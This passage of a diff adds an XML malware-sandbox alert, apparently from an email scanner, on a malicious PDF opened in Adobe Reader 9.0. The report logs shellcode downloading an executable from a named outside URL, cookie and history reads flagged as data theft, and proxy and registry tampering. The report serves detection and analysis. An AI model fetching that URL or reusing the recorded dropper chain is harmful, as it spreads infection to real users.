+              <symbol-name>GetProcAddressStub</symbol-name>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>kernel32</dllname>
+          <apiname>LoadLibraryA</apiname>
+          <address>0x01f80101</address>
+          <params>
+            <param id="1">urlmon.dll</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x76aa2869</instruction-address>
+              <module-name>C:\Windows\system32\kernel32.dll</module-name>
+              <symbol-name>LoadLibraryA</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x01f80101</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x77d9507c</instruction-address>
+              <module-name>C:\Windows\SYSTEM32\ntdll.dll</module-name>
+              <symbol-name>NtMapViewOfSection</symbol-name>
+              <symbol-displacement>0x0000000c</symbol-displacement>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>4</frame-number>
+              <instruction-address>0x01139568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <exploitcode>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <dllname>urlmon</dllname>
+          <apiname>URLDownloadToFileA</apiname>
+          <address>0x01f8011b</address>
+          <params>
+            <param id="1">0x00000000</param>
+            <param id="2">http://www.ineedstorage.com/images/1023.exe</param>
+            <param id="3">C:\Users\admin\AppData\Local\Temp\d.1xd</param>
+            <param id="4">0</param>
+            <param id="5">0x00000000</param>
+          </params>
+          <callstack>
+            <callstack-entry>
+              <frame-number>1</frame-number>
+              <instruction-address>0x764c480f</instruction-address>
+              <module-name>C:\Windows\system32\urlmon.dll</module-name>
+              <symbol-name>URLDownloadToFileA</symbol-name>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>2</frame-number>
+              <instruction-address>0x01f8011b</instruction-address>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>3</frame-number>
+              <instruction-address>0x77d9507c</instruction-address>
+              <module-name>C:\Windows\SYSTEM32\ntdll.dll</module-name>
+              <symbol-name>NtMapViewOfSection</symbol-name>
+              <symbol-displacement>0x0000000c</symbol-displacement>
+            </callstack-entry>
+            <callstack-entry>
+              <frame-number>4</frame-number>
+              <instruction-address>0x01139568</instruction-address>
+            </callstack-entry>
+          </callstack>
+        </exploitcode>
+        <file mode="open">
+          <value>C:\Users\admin\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\index.dat</value>
+          <fid ads="">844424930148956</fid>
+          <filesize>81920</filesize>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </file>
+        <folder mode="open">
+          <value>C:\Users\admin\AppData\Roaming\Microsoft\Windows\Cookies</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </folder>
+        <file mode="open">
+          <value>C:\Users\admin\AppData\Roaming\Microsoft\Windows\Cookies\index.dat</value>
+          <fid ads="">844424930149057</fid>
+          <filesize>32768</filesize>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </file>
+        <malicious-alert classtype="data-theft">
+          <msg>Malware reading IE cookie index</msg>
+          <display-msg>Internet Explorer cookie index read</display-msg>
+        </malicious-alert>
+        <file mode="open">
+          <value>C:\Users\admin\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat</value>
+          <fid ads="">844424930149058</fid>
+          <filesize>32768</filesize>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </file>
+        <malicious-alert classtype="data-theft">
+          <msg>Malware reading IE history index</msg>
+          <display-msg>Internet Explorer history index read</display-msg>
+        </malicious-alert>
+        <regkey mode="added">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASAPI32</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASAPI32\"EnableFileTracing" = 0x00000000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASAPI32\"EnableConsoleTracing" = 0x00000000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASAPI32\"FileTracingMask" = 0xffff0000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASAPI32\"ConsoleTracingMask" = 0xffff0000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASAPI32\"MaxFileSize" = 0x00100000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASAPI32\"FileDirectory" = %windir%\tracing</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="added">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASMANCS</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASMANCS\"EnableFileTracing" = 0x00000000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASMANCS\"EnableConsoleTracing" = 0x00000000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASMANCS\"FileTracingMask" = 0xffff0000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASMANCS\"ConsoleTracingMask" = 0xffff0000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASMANCS\"MaxFileSize" = 0x00100000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\MACHINE\SOFTWARE\Microsoft\Tracing\AcroRd32_RASMANCS\"FileDirectory" = %windir%\tracing</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <processstats>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <bytesreceived>0</bytesreceived>
+          <totalmemory>517021696</totalmemory>
+          <id>24</id>
+          <deltatime>1623</deltatime>
+        </processstats>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\"ProxyEnable" = 0x00000000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Malware modifying browser proxy settings</msg>
+          <display-msg>Browser settings tampered</display-msg>
+        </malicious-alert>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections\"SavedLegacySettings" = 46 00 00 00 17 00 00 00 09 00 00 00 0d 00 00 00 31 30 2e 30 2e 30 2e 32 3a 38 30 38 30 00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 70 5b c1 3c 06 c6 cc 01 00 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 17 00 00 00 00 00 00 00 fe 80 00 00 00 00 00 00 54 8d 2e 5e c2 a7 ad f1 0b 00 00 00 73 00 5c 00 53 00 79 00 73 00 74 00 65 00 6d 00 33 00 32 00 5c 00 57 00 62 00 65 00 6d 00 3b 00 43 00 3a 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 5c 00 53 00 79 00 73 00 74 00 65 00 6d 00 33 00 32 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 50 00 6f 00 77 00 65 00 72 00 53 00 68 00 02 00 00 00 0a 00 02 0f 00 00 00 00 00 00 00 00 5c 00 00 00 00 00 00 00 13 00 00 13 91 1b 00 00 60 86 3c 00 b0 79 39 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Browser network configuration modified</msg>
+          <display-msg>Network settings tampered</display-msg>
+        </malicious-alert>
+        <mutex>
+          <value />
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <network mode="connected">
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <protocol_type>udp</protocol_type>
+          <destination_port>60715</destination_port>
+          <ipaddress>127.0.0.1</ipaddress>
+        </network>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Malware attempting connections to loopback interface</msg>
+          <display-msg>Loopback communication attempted</display-msg>
+        </malicious-alert>
+        <mutex>
+          <value>\Sessions\1\BaseNamedObjects\ZonesCounterMutex</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <mutex>
+          <value>\Sessions\1\BaseNamedObjects\ZoneAttributeCacheCounterMutex</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <mutex>
+          <value>\Sessions\1\BaseNamedObjects\ZonesCacheCounterMutex</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"UNCAsIntranet" = 0x00000000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"AutoDetect" = 0x00000001</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <mutex>
+          <value>\Sessions\1\BaseNamedObjects\ZoneAttributeCacheCounterMutex</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <mutex>
+          <value>\Sessions\1\BaseNamedObjects\ZonesLockedCacheCounterMutex</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </mutex>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"UNCAsIntranet" = 0x00000000</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <regkey mode="setval">
+          <value>\REGISTRY\USER\S-1-5-21-344981575-398944299-1130229096-1000\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\"AutoDetect" = 0x00000001</value>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+        </regkey>
+        <uac mode="service">
+          <value>Windows Error Reporting Service</value>
+          <status>running</status>
+        </uac>
+        <process mode="terminated">
+          <value>C:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</value>
+          <pid>2476</pid>
+          <ppid>2452</ppid>
+          <parentname>C:\Windows\System32\cmd.exe</parentname>
+          <cmdline>N/A</cmdline>
+          <fid ads="">281474976768141</fid>
+        </process>
+        <appexception>
+          <processinfo>
+            <pid>2476</pid>
+            <imagepath>c:\Program Files\Adobe\Reader 9.0\Reader\AcroRd32.exe</imagepath>
+          </processinfo>
+          <exception_faulting_address>0x76079617</exception_faulting_address>
+          <exception_code>0x6BA</exception_code>
+          <exception_level>SECOND_CHANCE</exception_level>
+          <exception_type>UNKNOWN</exception_type>
+          <instruction_address>0x0000000076079617</instruction_address>
+          <description>Error Code (0x6ba)</description>
+          <classification>UNKNOWN</classification>
+          <bug_title>Error Code (0x6ba) starting at KERNELBASE!RaiseException+0x0000000000000054 (Hash=0x12480967.0x12482367)</bug_title>
+        </appexception>
+        <malicious-alert classtype="misc-anomaly">
+          <msg>Malware crashed primary application</msg>
+          <display-msg>Primary application crash detected</display-msg>
+        </malicious-alert>
+        <uac mode="service">
+          <value>Multimedia Class Scheduler</value>
+          <status>stopped</status>
+        </uac>
+        <end-of-report />
+      </os-changes>
+      <anomaly>misc-anomaly</anomaly>
+    </explanation>
+    <smtp-message id="5086f1ac.890e700a.7426.fffff8cf@mx.google.com">
+      <last-malware>Malicious.URL</last-malware>
+      <protocol>9</protocol>
+      <date>Tue, 23 Oct 2012 12:36:12 -0700</date>
+      <subject>13842 rep</subject>
+    </smtp-message>
+    <src>
+      <domain>sra.com</domain>
+      <smtp-mail-from>MAILER-DAEMON@mailport2.sra.com</smtp-mail-from>
+      <url>/analysis/E2AE822F0018-0-13842.pdf</url>
+    </src>
+    <dst>
+      <smtp-to>srabadgebox@mail.portal.sra.com</smtp-to>
+    </dst>
+    <occurred>2012-10-23T21:33:34.411</occurred>
+    <alert-url>https://10.3.79.36/emps/eanalysis?e_id=12539652</alert-url>
+    <action>notified</action>
+  </alert>
+</alerts>
